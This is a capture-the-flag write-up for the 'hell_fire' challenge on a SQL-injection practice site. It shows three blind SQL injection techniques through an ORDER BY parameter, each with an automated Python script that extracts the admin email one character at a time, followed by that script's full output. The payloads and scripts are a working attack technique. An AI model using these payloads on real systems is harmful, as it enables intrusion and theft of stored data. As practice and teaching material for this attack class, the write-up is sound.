---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 23
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/50a38bf9-d127-4ab6-ad25-321eb0130c99)

We are provided with the SQL queries:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY {$_GET[order]}
```

```sql
SELECT email FROM prob_hell_fire WHERE id='admin' AND email='{$_GET[email]}'`
```

This challenge returns the output in the form of a table.

If we provide the following URI parameter:

```
?order=id
```

The resultant query becomes:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY id
```

![2](https://github.com/Kunull/Write-ups/assets/110326359/a1e61aae-d070-4cea-b385-c1e6cd9195fb)

There are two users: `admin` and `rubiya`.

We can solve this challenge using two different methods:

- [Assigning sort value](#blind-sql-injection---assigning-different-sort-value)
- [Sorting by different columns](#blind-sql-injection---sorting-by-different-columns)
- [Sorting by ASC or DESC](#blind-sql-injection---sorting-by-asc-or-desc)

## Blind SQL Injection - (Assigning different sort value)

In this method, we assign a lower sort value to the row which meets the condition. This will cause the row to be displayed first.

### Retrieving the email length

If we provide the following URI parameter:

```
?order=if(id='admin' AND length(email)=[length], 1, 2)
```

The resultant query becomes:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND length(email)=[length], 1, 2)
```

Rows where the length of `email` for `id='admin'` is equal to the `[length]` that we provide, will be given the sort value 1. All other rows will be given the sort value 2. Rows with a lower sort value will appear first within the table.

So, if the admin user appears first, we know that the [length] was correct.

### Leaking the email

If we provide the following URI parameter:

```
?order=if(id='admin' AND ord(substr(email, [index], 1))='ord([character])', 1, 2)
```

The resultant query becomes:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND ord(substr(email, 1, 1))='ord([character])', 1, 2)
```

Rows where the `id='admin'` and character of the `email` at `[index]` is the same as the `[character]` that we provide, will be given the sort value 1. All other rows will be given sort value 2. Rows with a lower sort value will appear first within the table.

### Script

We can automate this process using a script. Since `_` and `.` are filtered out, we will have to convert these characters into their ASCII representation using the `ord()` function.

```python title="hell_fire_script.py"
import requests
import urllib.parse
import string

cookies = {'PHPSESSID': 'fgpbvjdctvq3qasns4lba8a85p'}
url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"
password_length = 0

for x in range(0, 100):
  payload = f"if(id='admin' and length(email)={x}, 1, 2)"
  encoded_payload = urllib.parse.quote_plus(payload)
  full_url = f"{url}?order={encoded_payload}"
    
  response = requests.get(full_url, cookies=cookies)
    
  if "<table border=1><tr><th>id</th><th>email</th><th>score</th><tr><td>admin</td>" in response.text:
    password_length = x
    break

print()    
print(f"[!] Payload: ?order={payload}")
print(f"[!] Payload (URL encoded): ?order={encoded_payload}")
print(f"[!] Email length: {password_length}")

password = ""
searchspace = '_@.' +  string.digits + string.ascii_letters

print(searchspace)

for index in range(1, password_length + 1):
  for char in searchspace:
    payload = f"if(id='admin' AND ord(substr(email, {index}, 1))='{ord(char)}', 1, 2)"
    encoded_payload = urllib.parse.quote_plus(payload)
    full_url = f"{url}?order={encoded_payload}"

    response = requests.get(full_url, cookies=cookies)

    if "<table border=1><tr><th>id</th><th>email</th><th>score</th><tr><td>admin</td>" in response.text:
      password += char
      print()
      print(f"[+] Payload: ?order={payload}")
      print(f"[+] Payload (URL encoded): ?order={encoded_payload}")
      print(f"[+] Character at index {index}: {char}")
      break

print()
print(f"[!] Extracted email: {password}")
print(f"[!] Final payload: ?email={password}")
```

```
$ python .\hell_fire_script.py

[!] Payload: ?order=if(id='admin' and length(email)=28, 1, 2)
[!] Payload (URL encoded): ?order=if%28id%3D%27admin%27+and+length%28email%29%3D28%2C+1%2C+2%29
[!] Email length: 28

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 1, 1))='97', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+1%2C+1%29%29%3D%2797%27%2C+1%2C+2%29
[+] Character at index 1: a

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 2, 1))='100', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+2%2C+1%29%29%3D%27100%27%2C+1%2C+2%29
[+] Character at index 2: d

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 3, 1))='109', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+3%2C+1%29%29%3D%27109%27%2C+1%2C+2%29
[+] Character at index 3: m

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 4, 1))='105', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+4%2C+1%29%29%3D%27105%27%2C+1%2C+2%29
[+] Character at index 4: i

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 5, 1))='110', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+5%2C+1%29%29%3D%27110%27%2C+1%2C+2%29
[+] Character at index 5: n

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 6, 1))='95', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+6%2C+1%29%29%3D%2795%27%2C+1%2C+2%29
[+] Character at index 6: _

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 7, 1))='115', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+7%2C+1%29%29%3D%27115%27%2C+1%2C+2%29
[+] Character at index 7: s

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 8, 1))='101', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+8%2C+1%29%29%3D%27101%27%2C+1%2C+2%29
[+] Character at index 8: e

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 9, 1))='99', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+9%2C+1%29%29%3D%2799%27%2C+1%2C+2%29
[+] Character at index 9: c

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 10, 1))='117', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+10%2C+1%29%29%3D%27117%27%2C+1%2C+2%29
[+] Character at index 10: u

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 11, 1))='114', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+11%2C+1%29%29%3D%27114%27%2C+1%2C+2%29
[+] Character at index 11: r

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 12, 1))='101', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+12%2C+1%29%29%3D%27101%27%2C+1%2C+2%29
[+] Character at index 12: e

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 13, 1))='95', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+13%2C+1%29%29%3D%2795%27%2C+1%2C+2%29
[+] Character at index 13: _

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 14, 1))='101', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+14%2C+1%29%29%3D%27101%27%2C+1%2C+2%29
[+] Character at index 14: e

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 15, 1))='109', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+15%2C+1%29%29%3D%27109%27%2C+1%2C+2%29
[+] Character at index 15: m

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 16, 1))='97', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+16%2C+1%29%29%3D%2797%27%2C+1%2C+2%29
[+] Character at index 16: a

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 17, 1))='105', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+17%2C+1%29%29%3D%27105%27%2C+1%2C+2%29
[+] Character at index 17: i

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 18, 1))='108', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+18%2C+1%29%29%3D%27108%27%2C+1%2C+2%29
[+] Character at index 18: l

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 19, 1))='64', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+19%2C+1%29%29%3D%2764%27%2C+1%2C+2%29
[+] Character at index 19: @

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 20, 1))='101', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+20%2C+1%29%29%3D%27101%27%2C+1%2C+2%29
[+] Character at index 20: e

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 21, 1))='109', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+21%2C+1%29%29%3D%27109%27%2C+1%2C+2%29
[+] Character at index 21: m

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 22, 1))='97', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+22%2C+1%29%29%3D%2797%27%2C+1%2C+2%29
[+] Character at index 22: a

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 23, 1))='105', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+23%2C+1%29%29%3D%27105%27%2C+1%2C+2%29
[+] Character at index 23: i

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 24, 1))='49', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+24%2C+1%29%29%3D%2749%27%2C+1%2C+2%29
[+] Character at index 24: 1

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 25, 1))='46', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+25%2C+1%29%29%3D%2746%27%2C+1%2C+2%29
[+] Character at index 25: .

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 26, 1))='99', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+26%2C+1%29%29%3D%2799%27%2C+1%2C+2%29
[+] Character at index 26: c

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 27, 1))='111', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+27%2C+1%29%29%3D%27111%27%2C+1%2C+2%29
[+] Character at index 27: o

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 28, 1))='109', 1, 2)
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+28%2C+1%29%29%3D%27109%27%2C+1%2C+2%29
[+] Character at index 28: m

[!] Extracted email: admin_secure_email@emai1.com
[!] Final payload: ?email=admin_secure_email@emai1.com
```

## Blind SQL Injection - (Sorting by different columns)

In this method, we will sort by the `id` column and the `score` column.
In the table, `admin` comes first if sorted by `id` and `rubiya` comes first if sorted by `score`.

### Retrieving the email length

If we provide the following URI parameter:

```
?order=if(id='admin' AND length(email)=length, 'id', 'score')
```

The resultant query becomes:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND length(email)=28, 'id', 'score')
```

If the length of `email` for `id='admin'` is equal to the `[length]` that we provide, the rows will be sorted by `id`. Otherwise, the rows will be sorted by `score`.

So, if the admin user appears first, we know that the [length] was correct.

### Leaking the email

If we provide the following URI parameter:

```
?order=if(id='admin' AND substr(email, 1, 1)='a', 'id', 'score')
```

The resultant query becomes:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND substr(email, 1, 1)='a', 'id', 'score')
```

If the `id='admin'` and character of the `email` at `[index]` is the same as the `[character]` that we provide, the rows will be sorted by `id`. Otherwise, the rows will be sorted by `score`.

So, if the admin user appears first, we know that the [character] at [index] was correct.

### Script

```python title="hell_fire_script.py"
import requests
import urllib.parse
import string

cookies = {'PHPSESSID': 'fgpbvjdctvq3qasns4lba8a85p'}
url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"
password_length = 0

for x in range(0, 100):
  payload = f"if(id='admin' and length(email)={x}, 'id', 'score')"
  encoded_payload = urllib.parse.quote_plus(payload)
  full_url = f"{url}?order={encoded_payload}"
    
  response = requests.get(full_url, cookies=cookies)
    
  if "<table border=1><tr><th>id</th><th>email</th><th>score</th><tr><td>admin</td>" in response.text:
    password_length = x
    break

print()    
print(f"[!] Payload: ?order={payload}")
print(f"[!] Payload (URL encoded): ?order={encoded_payload}")
print(f"[!] Email length: {password_length}")

password = ""
searchspace = '_@.' +  string.digits + string.ascii_letters

print(searchspace)

for index in range(1, password_length + 1):
  for char in searchspace:
    payload = f"if(id='admin' AND ord(substr(email, {index}, 1))='{ord(char)}', 'id', 'score')"
    encoded_payload = urllib.parse.quote_plus(payload)
    full_url = f"{url}?order={encoded_payload}"

    response = requests.get(full_url, cookies=cookies)

    if "<table border=1><tr><th>id</th><th>email</th><th>score</th><tr><td>admin</td>" in response.text:
      password += char
      print()
      print(f"[+] Payload: ?order={payload}")
      print(f"[+] Payload (URL encoded): ?order={encoded_payload}")
      print(f"[+] Character at index {index}: {char}")
      break

print()
print(f"[!] Extracted email: {password}")
print(f"[!] Final payload: ?email={password}")
```

```
python .\hell_fire_script.py

[!] Payload: ?order=if(id='admin' and length(email)=28, 'id', 'score')
[!] Payload (URL encoded): ?order=if%28id%3D%27admin%27+and+length%28email%29%3D28%2C+%27id%27%2C+%27score%27%29
[!] Email length: 28
_@.0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 1, 1))='97', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+1%2C+1%29%29%3D%2797%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 1: a

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 2, 1))='100', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+2%2C+1%29%29%3D%27100%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 2: d

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 3, 1))='109', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+3%2C+1%29%29%3D%27109%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 3: m

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 4, 1))='105', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+4%2C+1%29%29%3D%27105%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 4: i

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 5, 1))='110', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+5%2C+1%29%29%3D%27110%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 5: n

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 6, 1))='95', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+6%2C+1%29%29%3D%2795%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 6: _

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 7, 1))='115', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+7%2C+1%29%29%3D%27115%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 7: s

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 8, 1))='101', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+8%2C+1%29%29%3D%27101%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 8: e

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 9, 1))='99', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+9%2C+1%29%29%3D%2799%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 9: c

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 10, 1))='117', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+10%2C+1%29%29%3D%27117%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 10: u

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 11, 1))='114', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+11%2C+1%29%29%3D%27114%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 11: r

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 12, 1))='101', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+12%2C+1%29%29%3D%27101%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 12: e

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 13, 1))='95', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+13%2C+1%29%29%3D%2795%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 13: _

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 14, 1))='101', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+14%2C+1%29%29%3D%27101%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 14: e

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 15, 1))='109', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+15%2C+1%29%29%3D%27109%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 15: m

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 16, 1))='97', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+16%2C+1%29%29%3D%2797%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 16: a

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 17, 1))='105', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+17%2C+1%29%29%3D%27105%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 17: i

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 18, 1))='108', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+18%2C+1%29%29%3D%27108%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 18: l

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 19, 1))='64', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+19%2C+1%29%29%3D%2764%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 19: @

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 20, 1))='101', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+20%2C+1%29%29%3D%27101%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 20: e

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 21, 1))='109', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+21%2C+1%29%29%3D%27109%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 21: m

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 22, 1))='97', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+22%2C+1%29%29%3D%2797%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 22: a

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 23, 1))='105', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+23%2C+1%29%29%3D%27105%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 23: i

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 24, 1))='49', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+24%2C+1%29%29%3D%2749%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 24: 1

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 25, 1))='46', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+25%2C+1%29%29%3D%2746%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 25: .

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 26, 1))='99', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+26%2C+1%29%29%3D%2799%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 26: c

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 27, 1))='111', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+27%2C+1%29%29%3D%27111%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 27: o

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 28, 1))='109', 'id', 'score')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+28%2C+1%29%29%3D%27109%27%2C+%27id%27%2C+%27score%27%29
[+] Character at index 28: m

[!] Extracted email: admin_secure_email@emai1.com
[!] Final payload: ?email=admin_secure_email@emai1.com
```

## Blind SQL Injection - (Sorting by ASC or DESC)

In this method, we will sort in the ascending order if the condition is met. If the condition is not met, we will sort in the descending order.

### Retrieving the email length

If we provide the following URI parameter:

```
?order=if(id='admin' AND length(email)=[length], '1 ASC', '1 DESC')
```

The resultant query becomes:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND length(email)=[length], '1 ASC', '1 DESC')
```

If the length of `email` for `id='admin'` is equal to the `[length]` that we provide, the rows will be sorted in ascending order. Otherwise, the rows will be sorted in descending order.

So, if the `admin` user appears first, we know that the `[length]` was correct.

### Leaking the email

If we provide the following URI parameter:

```
?order=if(id='admin' AND substr(email, 1, 1)='0', '1 ASC', '1 DESC')
```

The resultant query becomes:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND ord(substr(email, [index], 1))='ord([character])', '1 ASC', '1 DESC')
```

If the `id='admin'` and character of the `email` at `[index]` is the same as the `[character]` that we provide, the rows will be sorted in ascending order. Otherwise, the rows will be sorted in descending order.

So, if the `admin` user appears first, we know that the `[character]` at `[index]` was correct.

### Script

```python title="hell_fire_script.py"
import requests
import urllib.parse
import string

cookies = {'PHPSESSID': 'josojaca8vb3q57avmhb3ltni3'}
url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"
password_length = 0

for x in range(0, 100):
  payload = f"if(id='admin' and length(email)={x}, '1 ASC', '1 DESC')"
  encoded_payload = urllib.parse.quote_plus(payload)
  full_url = f"{url}?order={encoded_payload}"
    
  response = requests.get(full_url, cookies=cookies)
    
  if "<table border=1><tr><th>id</th><th>email</th><th>score</th><tr><td>admin</td>" in response.text:
    password_length = x
    break

print()    
print(f"[!] Payload: ?order={payload}")
print(f"[!] Payload (URL encoded): ?order={encoded_payload}")
print(f"[!] Email length: {password_length}")

password = ""
searchspace = '_@.' +  string.digits + string.ascii_letters

print(searchspace)

for index in range(1, password_length + 1):
  for char in searchspace:
    payload = f"if(id='admin' AND ord(substr(email, {index}, 1))='{ord(char)}', '1 ASC', '1 DESC')"
    encoded_payload = urllib.parse.quote_plus(payload)
    full_url = f"{url}?order={encoded_payload}"

    response = requests.get(full_url, cookies=cookies)

    if "<table border=1><tr><th>id</th><th>email</th><th>score</th><tr><td>admin</td>" in response.text:
      password += char
      print()
      print(f"[+] Payload: ?order={payload}")
      print(f"[+] Payload (URL encoded): ?order={encoded_payload}")
      print(f"[+] Character at index {index}: {char}")
      break

print()
print(f"[!] Extracted email: {password}")
print(f"[!] Final payload: ?email={password}")
```

```
$ python .\hell_fire_script.py

[!] Payload: ?order=if(id='admin' and length(email)=28, '1 ASC', '1 DESC')
[!] Payload (URL encoded): ?order=if%28id%3D%27admin%27+and+length%28email%29%3D28%2C+%271+ASC%27%2C+%271+DESC%27%29
[!] Email length: 28
_@.0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 1, 1))='97', '1 ASC', '1 DESC')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+1%2C+1%29%29%3D%2797%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 1: a

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 2, 1))='100', '1 ASC', '1 DESC')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+2%2C+1%29%29%3D%27100%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 2: d

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 3, 1))='109', '1 ASC', '1 DESC')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+3%2C+1%29%29%3D%27109%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 3: m

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 4, 1))='105', '1 ASC', '1 DESC')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+4%2C+1%29%29%3D%27105%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 4: i

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 5, 1))='110', '1 ASC', '1 DESC')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+5%2C+1%29%29%3D%27110%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 5: n

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 6, 1))='95', '1 ASC', '1 DESC')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+6%2C+1%29%29%3D%2795%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 6: _

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 7, 1))='115', '1 ASC', '1 DESC')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+7%2C+1%29%29%3D%27115%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 7: s

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 8, 1))='101', '1 ASC', '1 DESC')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+8%2C+1%29%29%3D%27101%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 8: e

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 9, 1))='99', '1 ASC', '1 DESC')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+9%2C+1%29%29%3D%2799%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 9: c

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 10, 1))='117', '1 ASC', '1 DESC')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+10%2C+1%29%29%3D%27117%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 10: u

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 11, 1))='114', '1 ASC', '1 DESC')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+11%2C+1%29%29%3D%27114%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 11: r

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 12, 1))='101', '1 ASC', '1 DESC')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+12%2C+1%29%29%3D%27101%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 12: e

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 13, 1))='95', '1 ASC', '1 DESC')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+13%2C+1%29%29%3D%2795%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 13: _

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 14, 1))='101', '1 ASC', '1 DESC')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+14%2C+1%29%29%3D%27101%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 14: e

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 15, 1))='109', '1 ASC', '1 DESC')
